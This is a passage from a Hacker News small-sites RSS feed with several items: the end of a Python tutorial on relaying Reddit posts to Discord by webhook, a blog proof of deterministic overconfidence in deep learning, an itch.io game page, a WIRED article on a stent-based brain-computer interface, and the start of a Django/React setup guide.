</span>    <span>embed</span> <span>=</span> <span>DiscordEmbed</span><span>(</span><span>title</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>],</span> <span>url</span><span>=</span><span>permalink</span><span>)</span>
    <span>embed</span><span>.</span><span>set_image</span><span>(</span><span>url</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'thumbnail'</span><span>])</span>
    <span>embed</span><span>.</span><span>set_footer</span><span>(</span><span>text</span><span>=</span><span>f"Video posted by </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'author'</span><span>]</span><span>}</span><span>"</span><span>)</span>

<span>else</span><span>:</span> <span># image post
</span>    <span>embed</span> <span>=</span> <span>DiscordEmbed</span><span>(</span><span>title</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>],</span> <span>url</span><span>=</span><span>permalink</span><span>)</span>
    <span>embed</span><span>.</span><span>set_image</span><span>(</span><span>url</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'url'</span><span>])</span>
    <span>embed</span><span>.</span><span>set_footer</span><span>(</span><span>text</span><span>=</span><span>f"Image posted by </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'author'</span><span>]</span><span>}</span><span>"</span><span>)</span>
</code></pre></div></div> <p>Once the above code has executed, we have a webhook object, and an embed object. To add the newly created embed in to the webhook request and execute it, we simply do:</p> <div><div><pre><code><span>webhook</span><span>.</span><span>add_embed</span><span>(</span><span>embed</span><span>)</span>
<span>webhook</span><span>.</span><span>execute</span><span>()</span>
</code></pre></div></div> <p>Which is pretty self-explanatory. We could capture the output of <code>webhook.execute()</code> to check whether things went ok. One problem we typically encounter is being rate limited if we use the webhook in quick succession. A simple workaround for this is to <code>import time</code> at the top of the file, and then add a <code>time.sleep(1)</code> after the execution above, to pause for a second after each webhook post.</p> <h2 id="fin"> <a href="#fin"></a> Fin </h2> <p><img src="https://danwalker.com/python-discord-reddit-feed/discord-feed.png" alt="Discord feed"></p> <p>Run the script on a cronjob, and voila!</p> <p>I keep a single small Digital Ocean VPS which hosts all my Discord bots and scrapers. An example cronjob to execute every 5 minutes might for this script could look like:</p> <div><div><pre><code><span>*</span>/5 <span>*</span> <span>*</span> <span>*</span> <span>*</span> /usr/bin/python /root/scripts/reddit2discord.py <span>&gt;&gt;</span> /dev/null 2&gt;&amp;1
</code></pre></div></div> <p>Some ideas to extend this script further could include filtering out certain posts, highlighting posts from certain authors, or using arguments with <code>argparse</code> to make the script more flexible.</p> <p>You can also combine subreddits in the URL to pull from multiple subreddits, for example: <code>https://www.reddit.com/r/discordapp+python/new/.json</code></p> <p>The full code can be found (and starred if you found it helpful) as a Gist <a href="https://gist.github.com/danwalkeruk/7b471a095c645f96456ec2dd3d4bc87f">here</a>.</p> <p>Enjoy your new #reddit-feed ‚úåÔ∏è</p> </div> </article> <!--comments-->    <!--end comments--> </main>   </div></div>]]>
            </description>
            <link>https://danwalker.com/python-discord-reddit-feed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937851</guid>
            <pubDate>Fri, 30 Oct 2020 00:37:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lessons learned from launch HN as an open source project]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937661">thread link</a>) | @cheeseblubber
<br/>
October 29, 2020 | https://www.papercups.io/blog/launch | <a href="https://web.archive.org/web/*/https://www.papercups.io/blog/launch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.papercups.io/blog/launch</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937661</guid>
            <pubDate>Fri, 30 Oct 2020 00:11:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deterministic Overconfidence]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937648">thread link</a>) | @keyboardman
<br/>
October 29, 2020 | https://leimao.github.io/blog/Deterministic-Overconfidence/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Deterministic-Overconfidence/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>Standard deep learning only learns a single model that could best represent the training data, rather than model ensembles which Bayesian learning learns. When it comes to prediction, given an input, the model could only predict one output value. Therefore, standard deep learning models for regression and classification do not capture model uncertainty. In classification, predictive probabilities obtained at the end of the pipeline, such as the softmax output, are often erroneously interpreted as model confidence.</p>



<p>Standard deep learning model only learns $y = f(x)$, whereas Bayesian model learns $p(\mathbf{y}|x)$, where $\mathbf{y}$ is an univariate or multivariate variable. Statistically, the predicted value $y$ from standard deep learning model is sampled from the distribution $p(\mathbf{y}|x)$ that Bayesian model predicts, i.e., $y \sim p(\mathbf{y}|x)$. In terms of regression, $y$ is usually a scalar value, we could evaluate the prediction uncertainty or confidence using metrics such as variance or standard deviation. In terms of classification, $y$ is usually an array that sums to $1.0$, we could evaluate the prediction uncertainty or confidence using metrics such as Shannon entropy. The Shannon entropy for standard deep learning classification model is $H(y)$, whereas the Shannon entropy for Bayesian classification model is usually computed using $H(\mathbb{E}(\mathbf{y}))$.</p>



<p>In this blog post, I would like to systematically discuss the deterministic overconfidence issues of uncertainty quantification in standard deep learning.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="multivariate-jensens-inequality">Multivariate Jensen‚Äôs Inequality</h4>

<p>In my previous blog post on <a href="https://leimao.github.io/blog/Multivariate-Jensen-Inequality/">‚ÄúMultivariate Jensen‚Äôs Inequality‚Äù</a>, we have proved Jensen‚Äôs inequality for the multivariate case.</p>



<p>If $\mathbf{X} \in \mathbb{R}^n$ is random multivariate variable and $f: \mathbb{R}^n \rightarrow \mathbb{R}$ is a convex function, then</p><p>

\[f(\mathbb{E}[\mathbf{X}]) \leq \mathbb{E}[f(\mathbf{X})]\]

</p><p>Similarly, if $f$ is a concave function, then</p><p>

\[f(\mathbb{E}[\mathbf{X}]) \geq \mathbb{E}[f(\mathbf{X})]\]

</p><h3 id="shannon-entropy">Shannon Entropy</h3>

<p>The discrete case of <a href="https://leimao.github.io/blog/Entropy-Perplexity/">Shannon entropy</a> is defined as follows.</p><p>

\[H(p) = - \sum_{i=1}^{n} p(x_i) \log_b p(x_i)\]

</p><p>where $n$ is the number of discrete states, $p(x_i)$ is the probability of the system being in the state $i$, and $\sum_{i=1}^{n} p(x_i) = 1$.</p>



<p>Shannon entropy could be used for measuring the uncertainty of a system, such as a machine learning classifier model.</p>



<p>For example, if a binary classifier predicts an input $x$ to be class $y^{+}$ and $y^{-}$ with a probability of $p = (0.999, 0.001)$. The Shannon entropy $H(p) \approx 0$, meaning that there is almost no uncertainty with the prediction and the system is almost 100% sure about the prediction. On the other hand, when $p = (0.500, 0.500)$, the Shannon entropy, if using $b = 2$, $H(p) = 1.0$ which is the largest entropy when using $b = 2$. This means that the uncertainty is the largest and the system is 100% unsure about the prediction.</p>



<p>Shannon entropy is strictly concave with respect to $p$. Here we would provide a quick proof.</p>



<p><em>Proof</em></p>



<p>We have defined the space of probabilities for $p$.</p><p>

\[P = \{(p_1, p_2, \cdots, p_n): 0 &lt; p_i &lt; 1, \sum_{i=1}^{n} p_i = 1 \}\]

</p><p>Given $p \in P$, and a real-numbered vector $q = (q_1, q_2, \cdots, q_n) \in \mathbb{R}^n$ such that $\sum_{i=1}^{n} q_i = 0$ and $q \neq \mathbf{0}$, there must exist a small range $\lambda \in [u, v]$ where $p + \lambda q \in P$. Then we have</p><p>

\[H(p + \lambda q) = - \sum_{i=1}^{n} (p_i + \lambda q_i) \log_b (p_i + \lambda q_i)\]

</p><p>The derivatives with respect to $\lambda$ are</p><p>

\[\begin{align}
\frac{d H}{d \lambda} &amp;= - \sum_{i=1}^{n} \Big [ q_i \log_b (p_i + \lambda q_i) + (p_i + \lambda q_i) \frac{1}{(p_i + \lambda q_i) \ln b} \Big] \\
&amp;= - \sum_{i=1}^{n} \Big [ q_i \log_b (p_i + \lambda q_i) + \frac{1}{\ln b} \Big] \\
&amp;= - \sum_{i=1}^{n} q_i \log_b (p_i + \lambda q_i) + \frac{n}{\ln b} \\
\end{align}\]

\[\begin{align}
\frac{d^2 H}{d \lambda^2} &amp;= - \sum_{i=1}^{n} \Big[ q_i  \frac{q_i}{(p_i + \lambda q_i) \ln b} \Big]\\
&amp;= - \frac{1}{\ln b} \sum_{i=1}^{n} \Big[ \frac{q_i^2}{(p_i + \lambda q_i)} \Big]\\
\end{align}\]

</p><p>Because $p + \lambda q \in P$, $0 &lt; p_i + \lambda q_i &lt; 1$ for any $i \in [1, n]$. Therefore,</p><p>

\[\begin{align}
\frac{d^2 H}{d \lambda^2} &lt; 0
\end{align}\]

</p><p>This concludes the proof that Shannon entropy is strictly concave with respect to $p$.</p>

<h3 id="deterministic-overconfidence">Deterministic Overconfidence</h3>

<p>Deterministic overconfidence states that for classification models, we have</p><p>

\[\mathbb{E}(H(\mathbf{y})) \leq H(\mathbb{E}(\mathbf{y}))\]

</p><p>In layman‚Äôs terms, this means that predicting a single output given an input using the standard deep learning model is very <strong>likely</strong> to have lower Shannon entropy compared to the expected value of Shannon entropy uncertainty from Bayesian model ensembles.</p>



<p>A concrete example is from the Shannon entropy computed from the probabilities using softmax function published in Yarin Gal‚Äôs paper <a href="https://arxiv.org/abs/1506.02142">‚ÄúDropout as a Bayesian Approximation: Representing Model Uncertainty in Deep Learning‚Äù</a>.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-10-11-Deterministic-Overconfidence/overconfidence.png">
    <figcaption>Binary Cross Entropy Deterministic Overconfidence</figcaption>
</figure>
</div>

<p>We are looking at the figure (b) in particular. If the input to the softmax function is the logits from the standard deep learning model, the output $y$ will be mostly likely the expected value $\mathbb{E}(\mathbf{y}) \approx 1.0$. Therefore, the Shannon entropy $H(y) \approx 0$ and $\mathbb{E}(H(\mathbf{y})) \approx 0.0$, meaning that the model is 100% sure most of the time about the predicted class even though the model has never seen the input $x$ and has to do extrapolation in order to predict. This suggest that apply the uncertainty quantification to the standard deep learning model is erroneous.</p>



<p>Let‚Äôs further take a look at what the Shannon entropy for the Bayesian model predictions. The Bayesian model predicts the distribution $\mathbf{y}$, and we could compute the expected value of the Shannon entropy $\mathbb{E}(H(\mathbf{y}))$. We could see from the figure that a lot of samples $y \sim p(\mathbf{y}|x)$ are away from $1.0$, therefore $\mathbb{E}(\mathbf{y})$ should be smaller than $1.0$, and $H(\mathbb{E}(\mathbf{y}))$ should be larger than $0$.</p>



<p>This analysis matches our statement of deterministic overconfidence that</p><p>

\[\mathbb{E}(H(\mathbf{y})) \leq H(\mathbb{E}(\mathbf{y}))\]

</p><h3 id="proof-to-deterministic-overconfidence">Proof to Deterministic Overconfidence</h3>

<p>The proof to deterministic overconfidence is extremely simple, given the prerequisites that have been shown early in the post.</p>



<p>Because Shannon entropy $H$ is strictly concave even for the multivariate case, we apply the multivariate Jensen‚Äôs inequality, we have</p><p>

\[\mathbb{E}(H(\mathbf{y})) \leq H(\mathbb{E}(\mathbf{y}))\]

</p><p>This concludes the proof.</p>

<h3 id="extensions">Extensions</h3>

<p>We have discussed the deterministic overconfidence for classification models. How about regression models. The short answer is that there is also deterministic overconfidence for regression models. If the uncertainty is measured using variance, without showing the proof formally, variance is also a concave function. By applying the multivariate Jensen‚Äôs inequality as we did for the Shannon entropy, we could also reach the same conclusion for regression models.</p>

<h3 id="caveats">Caveats</h3>

<p>The proof to deterministic overconfidence from the <a href="https://docs.aws.amazon.com/prescriptive-guidance/latest/ml-quantifying-uncertainty/app-a.html">AWS Prescriptive Guidance</a> is incorrect. In case AWS changes the web content, the PDF version of the doc could be found <a href="https://leimao.github.io/downloads/blog/2020-10-11-Deterministic-Overconfidence/quantifying-uncertainty-in-deep-learning-systems.pdf">here</a> in the Appendix A section.</p>



<p>There are two major issues in their argument and proof.</p>



<p>The deterministic overconfidence was not only restricted to using softmax but also other activation functions.</p>



<p>The major mistake they made is that the random variable $\mathbf{u}$ was defined between $[-\infty, +\infty]$, and it could not be separated into two regions and apply Jensen‚Äôs inequality separately.</p>

<h3 id="references">References</h3>

<ul>
  <li><a href="https://leimao.github.io/blog/Multivariate-Jensen-Inequality/">Multivariate Jensen‚Äôs Inequality</a></li>
  <li><a href="https://leimao.github.io/blog/Entropy-Perplexity/">Shannon Entropy</a></li>
  <li><a href="https://leimao.github.io/downloads/blog/2020-10-11-Deterministic-Overconfidence/chapShannon.pdf">Shannon Entropy‚Äôs Concavity</a></li>
  <li><a href="https://arxiv.org/abs/1506.02142">Dropout as a Bayesian Approximation: Representing Model Uncertainty in Deep Learning</a></li>
</ul>

      <hr>
      
    </div></div>]]>
            </description>
            <link>https://leimao.github.io/blog/Deterministic-Overconfidence/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937648</guid>
            <pubDate>Fri, 30 Oct 2020 00:09:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Standard Bits, an ultra lo-fi video game named after the Mac's graphics blitter]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937606">thread link</a>) | @doomlaser
<br/>
October 29, 2020 | https://doomlaser.itch.io/standardbits#game | <a href="https://web.archive.org/web/*/https://doomlaser.itch.io/standardbits#game">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="view_game_page_19099"><p>A downloadable game for Windows and macOS</p><div><div><div><div><div><table><tbody><tr><td>Updated</td><td><abbr title="10 October 2020 @ 02:00"><span></span> 22 days ago</abbr></td></tr><tr><td>Status</td><td><a href="https://itch.io/games/released">Released</a></td></tr><tr><td>Platforms</td><td><a href="https://itch.io/games/platform-windows">Windows</a>, <a href="https://itch.io/games/platform-osx">macOS</a></td></tr><tr><td>Rating</td><td><div title="5.0" itemprop="aggregateRating" itemtype="http://schema.org/AggregateRating" itemscope=""><div content="5.0" itemprop="ratingValue"></div><p><span content="3" itemprop="ratingCount">(3)</span></p></div></td></tr><tr><td>Author</td><td><a href="https://doomlaser.itch.io/">Doomlaser</a></td></tr><tr><td>Genre</td><td><a href="https://itch.io/games/genre-adventure">Adventure</a></td></tr><tr><td>Tags</td><td><a href="https://itch.io/games/tag-abstract">Abstract</a>, <a href="https://itch.io/games/tag-artgame">artgame</a>, <a href="https://itch.io/games/tag-atmospheric">Atmospheric</a>, <a href="https://itch.io/games/tag-experimental">Experimental</a>, <a href="https://itch.io/games/tag-exploration">Exploration</a>, <a href="https://itch.io/games/tag-glitch">glitch</a>, <a href="https://itch.io/games/tag-minimalist">Minimalist</a>, <a href="https://itch.io/games/tag-psychedelic">psychedelic</a>, <a href="https://itch.io/games/tag-walking-simulator">Walking simulator</a>, <a href="https://itch.io/games/tag-weird">weird</a></td></tr><tr><td>Average session</td><td><a href="https://itch.io/games/duration-minutes">A few minutes</a></td></tr><tr><td>Inputs</td><td><a href="https://itch.io/games/input-keyboard">Keyboard</a>, <a href="https://itch.io/games/input-x360">Xbox controller</a>, <a href="https://itch.io/games/input-gamepad">Gamepad (any)</a>, <a href="https://itch.io/games/input-joystick">Joystick</a>, <a href="https://itch.io/games/input-wiimote">Wiimote</a>, <a href="https://itch.io/games/input-playstation">Playstation controller</a>, <a href="https://itch.io/games/input-joy-con">Joy-Con</a></td></tr><tr><td>Accessibility</td><td><a href="https://itch.io/games/accessibility-highcontrast">High-contrast</a>, <a href="https://itch.io/games/accessibility-textless">Textless</a></td></tr><tr><td>Links</td><td><a rel="nofollow noopener" href="http://doomlaser.com/trekking-across-the-northeast-for-gamma-256-and-blip/">Homepage</a></td></tr></tbody></table></div></div></div><div><h2 id="comments">Comments</h2><p><a href="https://itch.io/login?return_to=https%3A%2F%2Fdoomlaser.itch.io%2Fstandardbits" data-register_action="comment">Log in with itch.io</a> to leave a comment.</p><div id="community_topic_posts_widget_76331"><div><div data-post="{&quot;user_id&quot;:43197,&quot;id&quot;:424865}" id="post-424865"><div><a href="https://itch.io/profile/toster12d3"></a><div><div><p>Omg I saw this game on ExperimentalGameplayDotCom years ago!</p><p>It's one of my favorite hm.. objects from there. A pure exploration experience. Thank you for that!<br></p></div></div></div></div></div></div></div></div><div><div><p id="video_embed_widget_56436"><iframe frameborder="0" allowfullscreen="" src="//www.youtube.com/embed/4mkonvxtT9Y"></iframe></p></div><p><a href="https://img.itch.zone/aW1hZ2UvNTkyMDEvMjY2MjcyLmdpZg==/original/bgTKnU.gif" target="_blank" data-image_lightbox="true"><img src="https://img.itch.zone/aW1hZ2UvNTkyMDEvMjY2MjcyLmdpZg==/347x500/X9%2Bu4%2F.gif"></a></p></div></div></div></div>]]>
            </description>
            <link>https://doomlaser.itch.io/standardbits#game</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937606</guid>
            <pubDate>Fri, 30 Oct 2020 00:02:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A New Way to Plug a Human Brain into a Computer: Via Veins]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937571">thread link</a>) | @mercurialshark
<br/>
October 29, 2020 | https://www.wired.com./story/a-new-way-to-plug-a-human-brain-into-a-computer-via-veins/ | <a href="https://web.archive.org/web/*/https://www.wired.com./story/a-new-way-to-plug-a-human-brain-into-a-computer-via-veins/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span>The hard part</span> of connecting a gooey, thinking brain to a cold, one-ing and zero-ing computer is getting information through your thick skull‚Äîor mine, or anyone‚Äôs. The whole point of a skull, after all, is keeping a brain safely separate from [waves hands at everything]. </p><p>So if that brain isn‚Äôt yours, the only way to tell what‚Äôs going on inside it is inference. People make very educated guesses based on what that brain tells a body to do‚Äîlike, if the body makes some noises that you can understand (that‚Äôs speech) or moves around in a recognizable way. That‚Äôs a problem for people trying to understand how the brain works, and an even bigger problem for people who because of injury or illness can‚Äôt move or speak. Sophisticated imaging technologies like functional magnetic resonance can give you some clues. But it‚Äôd be great to have something more direct. For decades, technologists have been trying to get brains to interface with computer keyboards or robot arms, to get meat to commune with silicon.</p><p>On Wednesday, a team of scientists and engineers showed results from a promising new approach. It involves <a data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.nature.com/articles/nbt.3428#Bib1&quot;}" href="https://www.nature.com/articles/nbt.3428#Bib1" rel="nofollow noopener" target="_blank">mounting electrodes</a> on an expandable, springy tube called a stent and threading it through a blood vessel that leads to the brain. In tests on two people, the researchers literally went for the jugular, running a stent-tipped wire up that vein in the throat and then into a vessel near the brain‚Äôs primary motor cortex, where they popped the spring. The electrodes snuggled into the vessel wall and started sensing when the people‚Äôs brains signaled their intention to move‚Äîand sent those signals wirelessly to a computer, via an infrared transmitter surgically inserted in the subjects‚Äô chests. In an <a data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://jnis.bmj.com/content/early/2020/10/23/neurintsurg-2020-016862&quot;}" href="https://jnis.bmj.com/content/early/2020/10/23/neurintsurg-2020-016862" rel="nofollow noopener" target="_blank">article</a> published in the <em>Journal of NeuroInterventional Surgery</em>, the Australian and US researchers describe how two people with paralysis due to amyotrophic lateral sclerosis (better known as Lou Gehrig‚Äôs disease) used such a device to send texts and fool around online by brain-control alone.</p><p>‚ÄúSelf-expanding stent technology has been well demonstrated in both cardiac and neurological applications to treat other disease. We just use that feature and put electrodes on top of the stent,‚Äù says Thomas Oxley, an interventional neurologist and CEO of Synchron, the company hoping to commercialize the technology. ‚ÄúIt‚Äôs fully implantable. Patients go home in a couple of days. And it‚Äôs plug-and-play.‚Äù</p><p>It took training once the subjects got home. The electrode-studded stent could pick up signals from the brain, but machine-learning algorithms have to figure out what those signals‚Äîimperfect reflections of a mind at work even under ideal conditions‚Äîactually represent. But after a few weeks of work, both patients could use an eye tracker to move a cursor and then click with a thought, using the implant. It doesn‚Äôt sound like much, but that was enough for both of them to send text messages, shop online, and otherwise perform activities of digital daily life.</p><p>The Food and Drug Administration hasn‚Äôt approved what Oxley calls a ‚Äústentrode‚Äù for widespread use yet, and the company is still chasing funding for more tests, but these preliminary results suggest that it‚Äôs a functioning brain-computer interface. The signal it receives isn‚Äôt packed full of information. For now, all the stentrode is picking up is one bit of information‚Äîeither a telepathic mouse-click or the absence of that click. But for some applications, maybe that‚Äôs enough. ‚ÄúThere‚Äôs been a lot of talk about data and channels, and really what should matter is, have you delivered a life-changing product to the patient?‚Äù Oxley says. ‚ÄúJust with a handful of outputs restored to the patient that they‚Äôre in control of, we‚Äôve got them controlling Windows 10.‚Äù</p></div></div><div><div><p>Much more ambitious brain-computer interfaces and neural prosthetics have been in the news lately. Last month, Elon Musk‚Äôs company Neuralink <a href="https://www.wired.com/story/neuralink-is-impressive-tech-wrapped-in-musk-hype/">demonstrated</a> a wireless BCI with more than a thousand flexible electrodes, designed to be inserted directly into a brain by a specialized robot surgeon. (The company has so far only shown short-term use in pigs.) Inserting electrodes is tricky; while it‚Äôs true that brain surgery isn‚Äôt exactly rocket science, it has risks whether the surgeon is a robot or not. Even flexible, thin electrodes like those that Neuralink demonstrated are invasive enough that the brain tries to defend against them, coating them with glial cells that reduce their ability to conduct the electrical impulses they‚Äôre looking for. And while implanted electrodes like those of the more commonly used ‚ÄúUtah array‚Äù can get clear signals from individual neurons, understanding what those signals mean is still science in progress. Plus, the brain sloshes around like jelly in a donut; fixed-in-place electrodes can damage it. But get it right and they can do more than brain research. ‚ÄúLocked-in‚Äù patients with ALS have used them as <a data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.nejm.org/doi/10.1056/NEJMoa1608085&quot;}" href="https://www.nejm.org/doi/10.1056/NEJMoa1608085" rel="nofollow noopener" target="_blank">successful brain-computer interfaces</a>, though they require training, maintenance, surgery, and so on.</p><p>Meanwhile, electrodes placed directly onto the scalp can pick up brain waves‚Äîelectroencephalograms, or EEGs‚Äîbut those lack the spatial detail of implanted electrodes. Neuroscientists know, very roughly, which part of the brain does what, but the more you know about which neurons are firing, the better you can tell what they‚Äôre firing about.</p><p>A more recent innovation, electrocorticography, places a mesh of electrodes directly onto the surface of the brain. In combination with smart spectral processing of the signals those electrodes pick up, ECoG is good enough to translate action in the part of the motor cortex that controls the lips, jaw, and tongue into <a href="https://www.wired.com/story/machine-reads-your-mind-talks/">text or even speech</a>. And there are other approaches. <a href="https://www.wired.com/story/brain-machine-interface-isnt-sci-fi-anymore/">CTRL-labs</a>, which Facebook <a data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.bloomberg.com/news/articles/2019-09-23/facebook-to-buy-startup-for-controlling-computers-with-your-mind&quot;}" href="https://www.bloomberg.com/news/articles/2019-09-23/facebook-to-buy-startup-for-controlling-computers-with-your-mind" rel="nofollow noopener" target="_blank">bought</a> for perhaps as much as $1 billion in 2019, tries to get motor signals from neurons in the wrist. <a href="https://www.wired.com/story/inside-the-race-to-build-a-brain-machine-interface/">Kernel</a> uses functional near-infrared spectroscopy on the head to sense brain activity.</p><p>Oxley and his colleagues‚Äô stentrode, if it keeps showing good results, will fit somewhere along the spectrum between implanted electrodes and EEG. Closer to the first thing than the second, its inventors hope. But it‚Äôs still early days. ‚ÄúThe core technology and the core idea is super cool, but given where they‚Äôre accessing the signals from, my expectation would be that this is a relatively low-fidelity signal relative to other brain-machine interface strategies,‚Äù says Vikash Gilja, who runs the Translational Neural Engineering Lab at UC San Diego. ‚ÄúWe at least know that high-density ECoG recording from the surface of the brain can convey information beyond what is being shown in this paper.‚Äù</p><p>A possible problem: Tissue conducts electrical impulses, but the electrodes in the stent are picking up signals from the brain through the cells of the blood vessel. That lowers signal content. ‚ÄúIf we were to take those cortical surface recordings and compare them to Utah array experiments‚Äîthe bulk of clinical experience with implanted electrodes‚ÄîI would say the style of recording in ECoG is a rate limiter,‚Äù Gilja says. (Just for transparency, I should point out that Gilja has done for-pay work with BCI companies including Neuralink, with whom Synchron could theoretically compete someday.)</p><p>So it might not be good enough for neuroscience, but it could be plenty useful for a person with paralysis who wants a low-maintenance BCI that doesn‚Äôt require drilling through the skull. ‚ÄúThere‚Äôs a trade-off between how invasive you want to be and at what level you collect information,‚Äù says Andrew Pruszynski, a neuroscientist at Western University in Canada. ‚ÄúThis is trying to get to the middle ground, to insert a catheter close to the neural activity. It‚Äôs obviously invasive, but certainly not as invasive as putting electrodes into the brain.‚Äù</p></div></div><div><div><p>And there‚Äôs more work to come. Oxley‚Äôs team hopes to expand their study to more human subjects. They‚Äôll be looking for possible side effects, like the chance that the stent could contribute to strokes (though this seems less likely as it embeds in the vessel walls, a process called endothelialization). They might find better locations for the stent, in blood vessels adjacent to other brain areas of interest; anywhere within 2 millimeters of a vessel big enough to accommodate the stentrode is fair game, Oxley says. The software could stand some improving, in terms of figuring out what the brain actually means when it emits its electrical bells and whistles, and some of their tests suggest the system could pick up more informational detail‚Äîlike which specific muscle the users were trying to contract. That could lead to more useful prosthetics or control of devices beyond Windows 10. ‚ÄúThe motor system, right now, is what‚Äôs going to deliver therapy for people who are paralyzed,‚Äù Oxley says. ‚ÄúBut when we start to engage with other areas of the brain, you begin to see how the technology is going to open up brain processing power.‚Äù It‚Äôs hard to predict what might happen when scientists actually figure out how to get inside someone‚Äôs head.</p><hr><p>More Great WIRED Stories</p><ul><li>üì© Want the latest on tech, science, and more? <a href="https://www.wired.com/newsletter?sourceCode=BottomStories">Sign up for our newsletters</a>!</li><li>High science: <a href="https://www.wired.com/story/this-is-my-brain-on-salvia/?itm_campaign=BottomRelatedStories_Sections_5&amp;itm_content=footer-recirc">This is my brain on salvia</a></li><li>The pandemic closed borders‚Äî<a href="https://www.wired.com/story/the-pandemic-closed-borders-and-stirred-a-longing-for-home/?itm_campaign=BottomRelatedStories_Sections_5&amp;itm_content=footer-recirc">and stirred a longing for home</a></li><li>The cheating scandal that <a href="https://www.wired.com/story/stones-poker-cheating-scandal/?itm_campaign=BottomRelatedStories_Sections_5&amp;itm_content=footer-recirc">ripped the poker world apart</a></li><li>How to trick out your <a href="https://www.wired.com/story/customize-iphone-home-screen-widgets-aesthetic-ios14/?itm_campaign=BottomRelatedStories_Sections_5&amp;itm_content=footer-recirc">iPhone home screen in iOS 14</a></li><li>The women who <a href="https://www.wired.com/story/the-women-who-invented-video-game-music/?itm_campaign=BottomRelatedStories_Sections_5&amp;itm_content=footer-recirc">invented video game music</a></li><li>üéÆ WIRED Games: Get the latest <a href="https://www.wired.com/tag/video-games/?itm_campaign=BottomRelatedStories_Sections_5&amp;itm_content=footer-recirc">tips, reviews, and more</a></li><li>üéß Things not sounding right? Check out our favorite <a href="https://www.wired.com/gallery/best-wireless-headphones/?itm_campaign=BottomRelatedStories&amp;itm_content=footer-recirc">wireless headphones</a>, <a href="https://www.wired.com/gallery/best-soundbars/?itm_campaign=BottomRelatedStories&amp;itm_content=footer-recirc">soundbars</a>, and <a href="https://www.wired.com/gallery/best-bluetooth-speakers/?itm_campaign=BottomRelatedStories&amp;itm_content=footer-recirc">Bluetooth speakers</a></li></ul></div></div></div></div>]]>
            </description>
            <link>https://www.wired.com./story/a-new-way-to-plug-a-human-brain-into-a-computer-via-veins/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937571</guid>
            <pubDate>Thu, 29 Oct 2020 23:58:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Setup Django with React]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937453">thread link</a>) | @rbanffy
<br/>
October 29, 2020 | https://mattsegal.dev/django-react.html | <a href="https://web.archive.org/web/*/https://mattsegal.dev/django-react.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>It's not too hard to get started with either Django or React. Both have great documentation and there are lots of tutorials online.
The tricky part is getting them to work together. Many people start with a Django project and then decide that they want to "add React" to it.
How do you do that though? Popular React scaffolding tools like <a href="https://github.com/facebook/create-react-app">Create React App</a> don't offer you a clear way to integrate with Django, leaving you to figure it out yourself. Even worse, there isn't just one way to set up a Django/React project. There are dozens of <a href="https://mattsegal.dev/django-spa-infrastructure.html">possible methods</a>, each with different pros and cons. Every time I create a new project using these tools I find the options overwhelming.</p>
<p>I think that most people should start with a setup that is as close to vanilla Django as possible: you take your existing Django app and sprinkle a little React on it to make the frontend more dynamic and interactive. For most cases, creating a completely seperate "single page app" frontend creates a lot of complexity and challenges without providing very much extra value for you or your users.</p>
<p>In this series of posts I will present an opinionated guide on how to setup and deploy a Django/React webapp. The focus will be on keeping things simple, incremental and understanding each step. I want you to be in a position to debug any problems yourself. At the end of each post, you should have a working project that you can use.</p>
<p>I'm going to assume that you know:</p>
<ul>
<li>the <a href="https://developer.mozilla.org/en-US/docs/Learn/Getting_started_with_the_web">basics of web development</a> (HTML, CSS, JavaScript)</li>
<li>the <a href="https://docs.djangoproject.com/en/3.1/intro/tutorial01/">basics of Django</a> (views, templates, static files)</li>
<li>the <a href="https://reactjs.org/tutorial/tutorial.html">basics of React</a> (components, props, rendering)</li>
</ul>
<p>I'm <strong>not</strong> going to assume that you know anything about Webpack, Babel, or any other JavaScript toolchain insanity.</p>
<h2>Example project</h2>
<p>The example code for this guide is hosted on <a href="https://github.com/MattSegal/django-react-guide">this GitHub repo</a>. The code for each section is available as a Git branch:</p>
<ul>
<li><a href="https://github.com/MattSegal/django-react-guide/tree/part-1-initial-django">Starting point</a></li>
